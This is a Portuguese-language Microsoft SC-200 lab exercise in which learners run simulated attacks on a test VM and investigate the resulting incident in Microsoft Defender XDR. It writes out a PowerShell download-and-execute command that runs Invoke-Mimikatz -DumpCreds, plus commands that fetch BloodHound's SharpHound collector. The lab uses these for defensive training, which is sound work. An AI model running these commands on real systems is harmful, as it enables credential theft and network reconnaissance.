---
lab:
  title: 'Exercício 2: mitigar os ataques com o Microsoft Defender para Ponto de Extremidade'
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# Roteiro de aprendizagem 2, Laboratório 1, Exercício 2: mitigar os ataques com o Microsoft Defender para Ponto de Extremidade

## Cenário do laboratório

![Visão geral do laboratório.](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

Você é um analista de operações de segurança que trabalha em uma empresa que está implantando o Microsoft Defender para Ponto de Extremidade. Seu gerente planeja integrar alguns dispositivos para fornecer informações sobre as alterações necessárias nos procedimentos de resposta da equipe de Operações de segurança (SecOps).

Para explorar os recursos de mitigação de ataques do Defender para Ponto de Extremidade, você executará dois ataques simulados.

>**Observação:** uma **[simulação de laboratório interativa](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** está disponível e permite que você clique neste laboratório no seu próprio ritmo. Você pode encontrar pequenas diferenças entre a simulação interativa e o laboratório hospedado, mas os principais conceitos e ideias que estão sendo demonstrados são os mesmos. 


### Tarefa 1: verificar integração de dispositivos

Nesta tarefa, você confirmará se o dispositivo foi integrado com êxito e criará um alerta de teste.

1. Se você ainda não estiver no portal do Microsoft Defender XDR em seu navegador Microsoft Edge, acesse (https://security.microsoft.com) e faça logon como Administrador do seu locatário.

1. No menu à esquerda, na área **Ativos** , selecione **Dispositivos**. Aguarde até que WIN1 apareça na página Dispositivos antes de continuar. Caso contrário, talvez seja necessário repetir essa tarefa para ver os alertas que serão gerados posteriormente.

    >**Observação:** se você tiver concluído o processo de integração e não vir dispositivos na lista de dispositivos após uma hora, isso pode indicar um problema de integração ou de conectividade.

1. Selecione **Configurações** na barra de menus à esquerda e, na página Configurações, selecione **Pontos de extremidade**.

1. Selecione **Integração** na seção Gerenciamento de dispositivo e verifique se *"Windows 10 e 11"* está selecionado como sistema operacional. A mensagem *"Primeiro dispositivo integrado"* agora mostra *Concluído*.

1. Role para baixo e, na seção *"2. Executar um teste de detecção"*, copie o script do teste de detecção selecionando o botão **Copiar**.  

1. Na barra de pesquisa do Windows da máquina virtual WIN1, digite **CMD** e escolha **Executar como Administrador** no painel direito do aplicativo Prompt de comando. 

1. Quando a janela "Controle de conta de usuário" for exibida, selecione **Sim** para permitir que o aplicativo seja executado. 

1. Cole o script clicando com o botão direito do mouse na janela **Administrador: Prompt de comando** e pressione **Enter** para executá-lo.

    >**Observação:** a janela fecha automaticamente após a execução do script.

### Tarefa 2: ataques simulados

Nesta tarefa, você executa dois ataques *simulados* usando o *PowerShell* em *WIN1* para explorar os recursos do Microsoft Defender para Ponto de Extremidade.

`Attack 1: Mimikatz - Credential Dumping`

1. No computador *WIN1*, digite **Command** na barra de pesquisa e selecione **Executar como administrador**.

1. Na janela do terminal, copie e cole o comando a seguir na janela **Administrador: prompt de comando** e pressione **Enter** para executá-lo.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Você verá uma mensagem com a informação *Acesso negado* e uma mensagem pop-up de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` exibindo *Ameaças encontradas*.

1. Saia da janela **Administrador: prompt de comando** digitando **sair** e pressionando **Enter**.

`Attack 2: Bloodhound - Collection`

1. No computador *WIN1*, digite **PowerShell** na barra de pesquisa, selecione **Windows PowerShell** e selecione **Executar como administrador**.

1. Copie e cole os comandos a seguir na janela **Administrador: Windows PowerShell** e pressione **Enter** para executá-los.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Observação:** Recomenda-se copiar, colar e executar os comandos um de cada vez. Você pode abrir o *Bloco de notas* e copiar os comandos em um arquivo temporário para fazer isso. O primeiro comando cria uma pasta chamada *ExternalPayloads* na mesma pasta onde a pasta *Atomic Red Team* está localizada. O segundo comando baixa o arquivo *SharpHound.ps1* do repositório GitHub do *BloodHound* e o salva na pasta *ExternalPayloads*.

1. Você verá uma mensagem pop-up de `Windows Security Virus and threats protection` exibindo o texto *Ameaças encontradas*.

1. Na janela do terminal, copie e cole o comando a seguir na janela **Administrador: Windows PowerShell** e pressione **Enter** para executá-los.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Se a saída é *True*, o arquivo de payload de malware não foi removido pelo Microsoft Defender Antivirus. Se a saída é *False*, o arquivo de payload de malware foi removido pelo Microsoft Defender Antivirus. Use a tecla de seta para cima para repetir o comando até que a saída seja *False*.

<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.

1. Select the **Tutorials** tab.

1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.

1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 

1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### Tarefa 3: investigar os ataques

1. No portal do Microsoft Defender XDR, selecione **Incidentes e alertas** na barra de menus à esquerda e selecione **Incidentes**.

1. Um novo incidente chamado "Várias famílias de ameaças foram detectadas em um ponto de extremidade" está no painel direito. Selecione o nome do incidente para carregar seus detalhes.

    >**Observação:** Você deverá ver os alertas *Bloodhound* e Mimikatz* no painel **Alertas**. Em **Ativos/Dispositivos**, o computador *win1* agora terá um **Nível de risco** *Alto*.

1. Selecione o botão **Gerenciar incidente** e uma nova folha de janela será exibida. 

1. Em **Marcas de incidente**, digite "Simulação" e selecione **Simulação (Criar)** para criar uma marca. 

1. Selecione o botão de alternância **Atribuir a** e adicione sua conta de usuário (Eu) como proprietário do incidente. 

1. Em **Classificação**, expanda o menu suspenso. 

1. Em **Atividade esperada e informativa**, selecione **Teste de segurança**. 

1. Adicione quaisquer comentários, se desejar, e selecione **Salvar** para atualizar o incidente e concluir.

1. Analise o conteúdo das guias *História de ataque, Alertas, Ativos, Investigações, Evidência e resposta* e *Resumo*. Dispositivos e Usuários estão na guia *Ativos*. A guia *História do ataque* exibe o *gráfico Incidente*. **Dica:** algumas guias podem estar ocultas devido ao tamanho da tela. Selecione a guia de reticências (...) para que elas apareçam.

    >**Aviso**: Os ataques simulados aqui são uma excelente fonte de aprendizado por meio da prática. Execute apenas os ataques nas instruções fornecidas para este laboratório ao usar o locatário do Azure fornecido pelo curso.  Você pode executar outros ataques simulados *após* este curso de treinamento ser concluído com esse locatário.

## Você concluiu o laboratório.
